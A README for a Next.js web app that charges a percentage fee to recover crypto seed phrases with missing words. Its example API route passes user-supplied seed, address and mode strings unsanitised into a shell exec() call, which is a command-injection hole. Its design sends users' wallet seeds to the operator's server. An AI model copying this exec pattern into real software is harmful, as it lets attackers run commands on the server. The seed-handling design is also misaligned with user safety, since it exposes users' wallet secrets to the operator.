# 🔐 Seed Phrase Recovery Tool

## ⚡ QUICK START (3 Commands)

```bash
# 1. Install
npm install

# 2. Run
npm run dev

# 3. Open http://localhost:3000
```

---

## 🎨 What's Built

✅ **Sleek Dark UI** - Glassmorphism, gradients, animations  
✅ **Dual Recovery Modes** - Target Address (fast) + Balance Discovery (deep)  
✅ **Smart Pricing** - Auto-calculated fees based on difficulty  
✅ **Progress Tracking** - Real-time recovery progress  
✅ **Fully Responsive** - Works on all devices  

---

## 🎯 How To Use In Cursor

### Step 1: Open Project
- Launch Cursor
- File → Open Folder → Select `seed-recovery-app`

### Step 2: Install Dependencies
Terminal in Cursor (Ctrl+` or Cmd+`):
```bash
npm install
```

### Step 3: Run Dev Server
```bash
npm run dev
```

Server starts at: **http://localhost:3000**

### Step 4: Test The UI
- Toggle between modes
- Enter seed: `word1 word2 _ word4 _ word6 ...` (use `_` for missing)
- Watch fees calculate automatically
- Click "Start Recovery" to see progress animation

---

## 💎 Pricing Structure

| Missing Words | Base Fee | Target Mode | Balance Mode |
|--------------|----------|-------------|--------------|
| 1 word       | 3%       | 1%          | 3%           |
| 2 words      | 5%       | 3%          | 5%           |
| 3 words      | 10%      | 8%          | 10%          |
| 4+ words     | 15%      | 13%         | 15%          |

**Target Address Mode = -2% discount** (faster recovery)

---

## 🔌 Connect Your Backend

The UI is complete, now add your Python recovery logic:

### Option A: Next.js API Route (Recommended)

Create `app/api/recover/route.ts`:

```typescript
import { NextRequest, NextResponse } from 'next/server'
import { exec } from 'child_process'
import { promisify } from 'util'

const execAsync = promisify(exec)

export async function POST(request: NextRequest) {
  const { seedPhrase, targetAddress, mode } = await request.json()
  
  try {
    const command = `python3 recovery.py "${seedPhrase}" "${targetAddress}" "${mode}"`
    const { stdout } = await execAsync(command)
    
    const result = JSON.parse(stdout)
    return NextResponse.json(result)
  } catch (error) {
    return NextResponse.json(
      { error: 'Recovery failed', details: error.message },
      { status: 500 }
    )
  }
}
```

Then update `app/page.tsx`, replace `handleRecovery`:

```typescript
const handleRecovery = async () => {
  setIsProcessing(true)
  setProgress(0)
  
  try {
    const response = await fetch('/api/recover', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        seedPhrase,
        targetAddress: mode === 'target' ? targetAddress : null,
        mode,
        minBalance,
        derivationRange
      })
    })
    
    const result = await response.json()
    
    if (result.success) {
      // Show success modal, reveal seed after payment
      console.log('Recovery successful!', result)
    }
  } catch (error) {
    console.error('Recovery error:', error)
  } finally {
    setIsProcessing(false)
  }
}
```

### Option B: Separate Flask API

Keep Python separate:

```python
# flask_api.py
from flask import Flask, request, jsonify
from flask_cors import CORS
import your_recovery_script

app = Flask(__name__)
CORS(app)

@app.route('/recover', methods=['POST'])
def recover():
    data = request.json
    result = your_recovery_script.recover(
        seed_phrase=data['seedPhrase'],
        target_address=data.get('targetAddress'),
        mode=data['mode']
    )
    return jsonify(result)

if __name__ == '__main__':
    app.run(port=5000)
```

Update `handleRecovery` in `app/page.tsx`:

```typescript
const response = await fetch('http://localhost:5000/recover', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ seedPhrase, targetAddress, mode })
})
```

---

## 🎨 Customization

### Change Colors
Edit `tailwind.config.js`:
```js
colors: {
  'crypto-dark': '#0a0e1a',      // Main background
  'crypto-darker': '#060913',    // Darker sections
  'crypto-purple': '#8b5cf6',    // Primary accent
  'crypto-blue': '#3b82f6',      // Secondary accent
}
```

### Modify Pricing
Edit `app/page.tsx`, find `getSuccessFee()`:
```typescript
const getSuccessFee = () => {
  const missing = getMissingWordsCount()
  const baseFee = missing === 1 ? 3 : missing === 2 ? 5 : missing === 3 ? 10 : 15
  const discount = mode === 'target' ? 2 : 0
  return Math.max(baseFee - discount, 1)
}
```

### Update Payment Addresses
Edit `app/page.tsx`, search for "Support This Project":
```tsx
<div className="glass-card p-3 font-mono text-xs">
  <div className="text-gray-500 mb-1">ETH</div>
  <div className="text-crypto-purple">YOUR_ETH_ADDRESS</div>
</div>
```

---

## 📦 Project Files Explained

```
seed-recovery-app/
├── app/
│   ├── page.tsx          # Main UI component (YOUR CODE GOES HERE)
│   ├── layout.tsx        # App wrapper (fonts, metadata)
│   └── globals.css       # All styles, animations, glassmorphism
│
├── tailwind.config.js    # Color scheme & custom classes
├── tsconfig.json         # TypeScript configuration
├── postcss.config.js     # CSS processing
└── package.json          # Dependencies & scripts
```

**Key File: `app/page.tsx`** - This is where all the magic happens. Contains:
- Recovery modes toggle
- Input fields & validation
- Fee calculation logic
- Progress tracking
- Success/error handling

---

## 🚀 Deployment

### Vercel (Easiest - Free Tier Available)
```bash
npm install -g vercel
vercel login
vercel deploy
```

### Build for Production
```bash
npm run build    # Creates optimized production build
npm start        # Serves production build
```

### Other Platforms
- **Netlify:** Connect GitHub repo, auto-deploy
- **Railway:** `railway up`
- **DigitalOcean:** Node.js droplet + PM2
- **AWS:** Amplify or EC2

---

## 🔧 Troubleshooting

**Port 3000 already in use?**
```bash
lsof -ti:3000 | xargs kill
npm run dev
```

**TypeScript errors?**
```bash
rm -rf .next node_modules package-lock.json
npm install
npm run dev
```

**Styling not working?**
- Verify `globals.css` is imported in `layout.tsx`
- Clear browser cache
- Restart dev server

**Node version issues?**
Requires Node 18+:
```bash
node -v  # Check version
# Use nvm to update if needed
```

---

## 🎯 Development Workflow

1. **Test UI First**
   - Run `npm run dev`
   - Test both modes
   - Verify all inputs work
   - Check fee calculation

2. **Add Backend Logic**
   - Create API route or Flask server
   - Test with sample seed phrases
   - Handle errors gracefully
   - Log recovery attempts

3. **Implement Payment**
   - Add payment verification
   - Reveal seed after confirmation
   - Store payment records (if needed)

4. **Deploy**
   - Test in production mode (`npm run build`)
   - Deploy to Vercel/Netlify
   - Update env variables
   - Monitor for errors

---

## 💡 Pro Tips

- **Security:** Never store seeds on your server
- **Performance:** Use Web Workers for intensive calculations
- **UX:** Add loading states for all async operations
- **Analytics:** Track success rates (anonymously)
- **Testing:** Test with BIP39 test vectors first

---

## 🛠️ Tech Stack

- **Next.js 16** - React framework with App Router
- **TypeScript** - Type-safe development
- **Tailwind CSS** - Utility-first styling
- **React 18** - UI library

---

## 📚 Resources

- **BIP39 Spec:** https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki
- **BIP44 Derivation:** https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki
- **Next.js Docs:** https://nextjs.org/docs
- **Tailwind Docs:** https://tailwindcss.com/docs

---

## ✅ Final Checklist

Before deploying:
- [ ] Test both recovery modes
- [ ] Backend API working
- [ ] Payment verification implemented
- [ ] Error handling complete
- [ ] Security reviewed
- [ ] UI tested on mobile
- [ ] Update payment addresses
- [ ] Set up analytics (optional)
- [ ] Create backup system
- [ ] Deploy to production

---

**Built with 💜 by Goldman**  
*Professional Web3 Recovery Specialist*

Need help? The UI is production-ready, just plug in your recovery logic and deploy! 🚀
